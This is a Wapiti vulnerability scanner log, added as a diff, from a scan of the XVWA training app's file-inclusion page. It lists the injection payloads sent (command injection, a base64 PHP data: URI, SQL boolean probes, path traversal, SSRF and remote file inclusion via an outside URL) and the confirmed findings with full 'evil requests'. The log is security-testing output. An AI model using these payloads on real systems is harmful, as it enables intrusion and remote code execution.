@@ -1,0 +1,139 @@
+2024-03-20 15:27:38.172 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/xvwa/vulnerabilities/fi/?file=fuzz (0)
+2024-03-20 15:27:38.294 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/xvwa/vulnerabilities/fi/ (1)
+2024-03-20 15:27:38.295 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/xvwa/vulnerabilities/fi/?file=readme.txt (1)
+2024-03-20 15:27:38.407 | GREEN    | wapitiCore.controller.wapiti:save_scan_state:359 - [*] Saving scan state, please wait...
+2024-03-20 15:27:38.407 | INFO     | wapitiCore.controller.wapiti:save_scan_state:363 - This scan has been saved in the file /home/wapiti/.wapiti/scans/web_folder_a5376e9c.db
+2024-03-20 15:27:38.409 | INFO     | wapitiCore.main.wapiti:wapiti_main:380 - [*] Wapiti found 3 URLs and forms during the scan
+2024-03-20 15:27:38.440 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:289 - [*] Existing modules:
+2024-03-20 15:27:38.441 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:290 - 	 backup, brute_login_form, buster, cookieflags, crlf, csp, csrf, drupal_enum, exec, file, htaccess, htp, http_headers, https_redirect, log4shell, methods, nikto, permanentxss, redirect, shellshock, spring4shell, sql, ssl, ssrf, takeover, timesql, upload, wapp, wp_enum, xss, xxe
+2024-03-20 15:27:38.526 | ERROR    | wapitiCore.controller.wapiti:_load_attack_modules:298 - [!] Unable to import module ssl: No module named 'humanize'
+2024-03-20 15:27:38.562 | ERROR    | wapitiCore.controller.wapiti:filter_modules_with_options:130 - [!] Unable to find a module named ssl
+2024-03-20 15:27:38.563 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module csp
+2024-03-20 15:27:38.581 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/fi/?file=fuzz (0)
+2024-03-20 15:27:38.590 | RED      | wapitiCore.attack.mod_csp:attack:58 - CSP is not set
+2024-03-20 15:27:38.689 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module exec
+2024-03-20 15:27:38.701 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/fi/?file=fuzz (0)
+2024-03-20 15:27:38.703 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=%3Benv%3B (0)
+2024-03-20 15:27:38.712 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=%7Cenv%7C (0)
+2024-03-20 15:27:38.720 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=a%3Benv%3B (0)
+2024-03-20 15:27:38.728 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=a%3Benv%3B (0)
+2024-03-20 15:27:38.735 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C (0)
+2024-03-20 15:27:38.744 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=fuzz%3Benv%3B (0)
+2024-03-20 15:27:38.752 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=fuzz%0Aenv%3B (0)
+2024-03-20 15:27:38.761 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=%26set%26 (0)
+2024-03-20 15:27:38.769 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=set (0)
+2024-03-20 15:27:38.779 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=env (0)
+2024-03-20 15:27:38.785 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=%2Fe%00 (0)
+2024-03-20 15:27:38.792 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 15:27:38.799 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 15:27:38.805 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 15:27:38.814 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 15:27:38.820 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 15:27:38.829 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 15:27:38.838 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 15:27:38.846 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 15:27:38.852 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 15:27:38.860 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 15:27:38.868 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 15:27:38.877 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 15:27:38.884 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D (0)
+2024-03-20 15:27:38.963 | RED      | wapitiCore.attack.mod_exec:attack:202 - ---
+2024-03-20 15:27:38.963 | RED      | wapitiCore.attack.mod_exec:attack:203 - PHP evaluation in http://web/xvwa/vulnerabilities/fi/ via injection in the parameter file
+2024-03-20 15:27:38.963 | RED      | wapitiCore.attack.mod_exec:attack:209 - Evil request:
+2024-03-20 15:27:38.963 | RED      | wapitiCore.attack.mod_exec:attack:210 -     GET /xvwa/vulnerabilities/fi/?file=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D HTTP/1.1
+    host: web
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: PHPSESSID=init35oeaqf09ckg9nl2b1hm1k
+2024-03-20 15:27:38.964 | RED      | wapitiCore.attack.mod_exec:attack:211 - ---
+2024-03-20 15:27:38.975 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/fi/ (1)
+2024-03-20 15:27:38.985 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/fi/?file=readme.txt (1)
+2024-03-20 15:27:39.000 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module upload
+2024-03-20 15:27:39.047 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module redirect
+2024-03-20 15:27:39.062 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/fi/?file=fuzz (0)
+2024-03-20 15:27:39.062 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/xvwa/vulnerabilities/fi/?file=https%3A%2F%2Fopenbugbounty.org%2F
+2024-03-20 15:27:41.228 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/xvwa/vulnerabilities/fi/?file=%2F%2Fopenbugbounty.org%2F
+2024-03-20 15:27:41.251 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/fi/ (1)
+2024-03-20 15:27:41.258 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/fi/?file=readme.txt (1)
+2024-03-20 15:27:41.281 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module cookieflags
+2024-03-20 15:27:41.294 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/fi/?file=fuzz (0)
+2024-03-20 15:27:41.295 | BLUE     | wapitiCore.attack.mod_cookieflags:attack:55 - Checking cookie : PHPSESSID
+2024-03-20 15:27:41.295 | RED      | wapitiCore.attack.mod_cookieflags:attack:57 - HttpOnly flag is not set in the cookie : PHPSESSID
+2024-03-20 15:27:41.364 | RED      | wapitiCore.attack.mod_cookieflags:attack:66 - Secure flag is not set in the cookie : PHPSESSID
+2024-03-20 15:27:41.437 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module http_headers
+2024-03-20 15:27:41.446 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/fi/?file=fuzz (0)
+2024-03-20 15:27:41.457 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Frame-Options:
+2024-03-20 15:27:41.458 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Frame-Options is not set
+2024-03-20 15:27:41.522 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Content-Type-Options:
+2024-03-20 15:27:41.523 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Content-Type-Options is not set
+2024-03-20 15:27:41.624 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module xss
+2024-03-20 15:27:41.638 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/fi/?file=fuzz (0)
+2024-03-20 15:27:41.664 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/fi/ (1)
+2024-03-20 15:27:41.670 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/fi/?file=readme.txt (1)
+2024-03-20 15:27:41.686 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module sql
+2024-03-20 15:27:41.698 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/fi/?file=fuzz (0)
+2024-03-20 15:27:41.698 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=fuzz%C2%BF%27%22%28 (0)
+2024-03-20 15:27:41.720 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=fuzz%20AND%2093%3D161%20AND%2089%3D89 (0)
+2024-03-20 15:27:41.739 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=fuzz%27%20AND%2062%3D99%20AND%20%2799%27%3D%2799 (0)
+2024-03-20 15:27:41.757 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=fuzz%22%20AND%2032%3D96%20AND%20%2218%22%3D%2218 (0)
+2024-03-20 15:27:41.777 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=fuzz%29%20AND%2066%3D165%20AND%20%2889%3D89 (0)
+2024-03-20 15:27:41.795 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=fuzz%27%29%20AND%2084%3D127%20AND%20%28%2749%27%3D%2749 (0)
+2024-03-20 15:27:41.813 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=fuzz%22%29%20AND%2047%3D129%20AND%20%28%2221%22%3D%2221 (0)
+2024-03-20 15:27:41.837 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/fi/ (1)
+2024-03-20 15:27:41.855 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/fi/?file=readme.txt (1)
+2024-03-20 15:27:41.868 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=readme.txt%20AND%2044%3D95%20AND%2031%3D31 (1)
+2024-03-20 15:27:41.884 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=readme.txt%20AND%2049%3D137%20AND%2046%3D46 (1)
+2024-03-20 15:27:41.902 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=readme.txt%20AND%2056%3D56%20AND%2075%3D75 (1)
+2024-03-20 15:27:41.920 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=readme.txt%27%20AND%2012%3D50%20AND%20%2711%27%3D%2711 (1)
+2024-03-20 15:27:41.937 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=readme.txt%27%20AND%2046%3D77%20AND%20%2755%27%3D%2755 (1)
+2024-03-20 15:27:41.954 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=readme.txt%27%20AND%2026%3D26%20AND%20%2732%27%3D%2732 (1)
+2024-03-20 15:27:41.970 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=readme.txt%22%20AND%2036%3D99%20AND%20%2275%22%3D%2275 (1)
+2024-03-20 15:27:41.987 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=readme.txt%22%20AND%2055%3D84%20AND%20%2214%22%3D%2214 (1)
+2024-03-20 15:27:42.003 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=readme.txt%22%20AND%2081%3D81%20AND%20%2218%22%3D%2218 (1)
+2024-03-20 15:27:42.018 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=readme.txt%29%20AND%2050%3D133%20AND%20%2894%3D94 (1)
+2024-03-20 15:27:42.033 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=readme.txt%29%20AND%2079%3D137%20AND%20%2874%3D74 (1)
+2024-03-20 15:27:42.049 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=readme.txt%29%20AND%2069%3D69%20AND%20%2845%3D45 (1)
+2024-03-20 15:27:42.067 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=readme.txt%27%29%20AND%2062%3D121%20AND%20%28%2712%27%3D%2712 (1)
+2024-03-20 15:27:42.082 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=readme.txt%27%29%20AND%2086%3D127%20AND%20%28%2794%27%3D%2794 (1)
+2024-03-20 15:27:42.099 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=readme.txt%27%29%20AND%2033%3D33%20AND%20%28%2792%27%3D%2792 (1)
+2024-03-20 15:27:42.115 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=readme.txt%22%29%20AND%2016%3D72%20AND%20%28%2295%22%3D%2295 (1)
+2024-03-20 15:27:42.204 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=readme.txt%22%29%20AND%2073%3D167%20AND%20%28%2290%22%3D%2290 (1)
+2024-03-20 15:27:42.223 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=readme.txt%22%29%20AND%2016%3D16%20AND%20%28%2298%22%3D%2298 (1)
+2024-03-20 15:27:42.260 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module ssrf
+2024-03-20 15:27:42.272 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/fi/?file=fuzz (0)
+2024-03-20 15:27:42.272 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Ftjwibq%2F1%2F66696c65%2F (0)
+2024-03-20 15:27:42.415 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/fi/ (1)
+2024-03-20 15:27:42.422 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/fi/?file=readme.txt (1)
+2024-03-20 15:27:42.449 | INFO     | wapitiCore.attack.mod_ssrf:finish:185 - [*] Asking endpoint URL https://wapiti3.ovh/get_ssrf.php?session_id=tjwibq for results, please wait...
+2024-03-20 15:27:44.623 | RED      | wapitiCore.attack.mod_ssrf:finish:246 - ---
+2024-03-20 15:27:44.624 | RED      | wapitiCore.attack.mod_ssrf:finish:247 - SSRF vulnerability in http://web/xvwa/vulnerabilities/fi/ via injection in the parameter file
+2024-03-20 15:27:44.624 | RED      | wapitiCore.attack.mod_ssrf:finish:254 - Evil request:
+2024-03-20 15:27:44.624 | RED      | wapitiCore.attack.mod_ssrf:finish:255 -     GET /xvwa/vulnerabilities/fi/?file=http%3A%2F%2Fexternal.url%2Fpage HTTP/1.1
+2024-03-20 15:27:44.624 | RED      | wapitiCore.attack.mod_ssrf:finish:256 - ---
+2024-03-20 15:27:44.624 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module file
+2024-03-20 15:27:44.641 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/fi/?file=fuzz (0)
+2024-03-20 15:27:44.646 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/fi/?file=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php (0)
+2024-03-20 15:27:44.863 | RED      | wapitiCore.attack.mod_file:attack:250 - ---
+2024-03-20 15:27:44.864 | RED      | wapitiCore.attack.mod_file:attack:251 - Remote inclusion vulnerability in http://web/xvwa/vulnerabilities/fi/ via injection in the parameter file
+2024-03-20 15:27:44.864 | RED      | wapitiCore.attack.mod_file:attack:261 - Evil request:
+2024-03-20 15:27:44.864 | RED      | wapitiCore.attack.mod_file:attack:262 -     GET /xvwa/vulnerabilities/fi/?file=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php HTTP/1.1
+    host: web
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: PHPSESSID=init35oeaqf09ckg9nl2b1hm1k
+2024-03-20 15:27:44.864 | RED      | wapitiCore.attack.mod_file:attack:263 - ---
+2024-03-20 15:27:44.875 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/fi/ (1)
+2024-03-20 15:27:44.884 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/fi/?file=readme.txt (1)
+2024-03-20 15:27:44.906 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module permanentxss
+2024-03-20 15:27:44.917 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/fi/?file=fuzz (0)
+2024-03-20 15:27:44.938 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/fi/ (1)
+2024-03-20 15:27:44.957 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/fi/?file=readme.txt (1)
+2024-03-20 15:27:45.055 | GREEN    | wapitiCore.controller.wapiti:write_report:601 - [*] Generating report...
+2024-03-20 15:27:45.079 | SUCCESS  | wapitiCore.controller.wapiti:write_report:603 - A report has been generated in the file ./data/output//fi.json/
+2024-03-20 15:27:45.080 | SUCCESS  | wapitiCore.controller.wapiti:write_report:605 - Open ./data/output//fi.json/web_03202024_1527.html with a browser to see this report.
